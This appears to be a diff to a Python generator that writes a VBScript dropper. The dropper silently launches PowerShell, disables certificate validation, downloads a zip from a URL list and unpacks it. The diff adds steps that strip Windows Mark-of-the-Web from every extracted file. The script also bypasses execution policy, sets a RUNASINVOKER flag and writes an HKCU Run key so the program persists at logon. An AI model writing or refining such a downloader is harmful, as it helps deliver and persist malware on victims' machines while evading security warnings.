@@ -98,7 +98,7 @@ def generate_vbs_script_content(app_name: str, app_title: str, endpoint_tag: str
         '    psDownload = psDownload & "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; "',
         f'    psDownload = psDownload & "$urls = @({zip_urls_ps}); "',
         '    psDownload = psDownload & "foreach ($u in $urls) { try { $req = [System.Net.HttpWebRequest]::Create($u); $req.Timeout = 5000; $req.ReadWriteTimeout = 60000; $res = $req.GetResponse(); $s = $res.GetResponseStream(); $fs = [System.IO.File]::Create(\'" & tempZip & "\'); $s.CopyTo($fs); $fs.Close(); $s.Close(); $res.Close(); if ((Test-Path \'" & tempZip & "\') -and (Get-Item \'" & tempZip & "\').Length -gt 1000) { break } } catch { if (Test-Path \'" & tempZip & "\') { Remove-Item \'" & tempZip & "\' -Force -ErrorAction SilentlyContinue } } }; "',
-        '    psDownload = psDownload & "if (Test-Path \'" & tempZip & "\') { if (-not (Test-Path \'" & installDir & "\')) { New-Item -ItemType Directory -Path \'" & installDir & "\' -Force | Out-Null }; Expand-Archive -Path \'" & tempZip & "\' -DestinationPath \'" & installDir & "\' -Force; Remove-Item \'" & tempZip & "\' -Force }"',
+        '    psDownload = psDownload & "if (Test-Path \'" & tempZip & "\') { if (-not (Test-Path \'" & installDir & "\')) { New-Item -ItemType Directory -Path \'" & installDir & "\' -Force | Out-Null }; Unblock-File -Path \'" & tempZip & "\' -ErrorAction SilentlyContinue; Expand-Archive -Path \'" & tempZip & "\' -DestinationPath \'" & installDir & "\' -Force; Get-ChildItem -Path \'" & installDir & "\' -Recurse | Unblock-File -ErrorAction SilentlyContinue; Remove-Item \'" & tempZip & "\' -Force }"',
         '    psDownload = psDownload & q',
         "",
         "    ws.Run psDownload, 0, True",
@@ -116,7 +116,7 @@ def generate_vbs_script_content(app_name: str, app_title: str, endpoint_tag: str
 
     if auto_start:
         lines.extend([
-            '    ws.Run "powershell -NoProfile -ExecutionPolicy Bypass -Command ""Unblock-File -Path \'" & targetExe & "\'""", 0, True',
+            '    ws.Run "powershell -NoProfile -ExecutionPolicy Bypass -Command ""Get-ChildItem -Path \'" & installDir & "\' -Recurse | Unblock-File""", 0, True',
             '    ws.RegWrite "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers\\" & targetExe, "~ RUNASINVOKER", "REG_SZ"',
             f'    ws.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{app_name}", q & targetExe & q, "REG_SZ"',
             "",
